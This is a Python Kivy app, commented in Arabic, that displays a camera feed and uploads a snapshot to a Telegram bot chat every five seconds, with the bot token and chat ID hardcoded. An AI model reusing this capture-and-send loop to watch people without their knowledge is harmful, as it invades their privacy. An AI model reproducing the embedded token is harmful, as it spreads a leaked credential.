from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.image import Image
from kivy.clock import Clock
from kivy.uix.camera import Camera
import requests
import time

class CameraMonitorApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.image = Image()
        
        # تعريف الكاميرا
        try:
            self.camera = Camera(play=True, resolution=(640, 480))
            self.layout.add_widget(self.image)
        except:
            self.camera = None

        # تحديث الشاشة
        Clock.schedule_interval(self.update_screen, 1.0 / 30.0)
        
        # لقط وإرسال صورة كل 5 ثواني
        Clock.schedule_interval(self.capture_and_send, 5.0)
        
        return self.layout

    def update_screen(self, dt):
        if self.camera and self.camera.texture:
            self.image.texture = self.camera.texture

    def capture_and_send(self, dt):
        if self.camera and self.camera.texture:
            filename = "monitor_capture.png"
            self.camera.export_to_png(filename)
            self.send_to_telegram(filename)

    def send_to_telegram(self, file_path):
        # التوكن والـ ID بتوعك يا بطل
        bot_token = "8465356373:AAH8qYI3VQ9FalFcRM_1jjyNTYJENKGi51M"
        chat_id = "7537500002" 
        
        url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
        try:
            with open(file_path, "rb") as photo:
                payload = {"chat_id": chat_id, "caption": f"تنبيه: صورة مراقبة\n{time.ctime()}"}
                files = {"photo": photo}
                requests.post(url, data=payload, files=files, timeout=10)
        except:
            pass

if __name__ == '__main__':
    CameraMonitorApp().run()
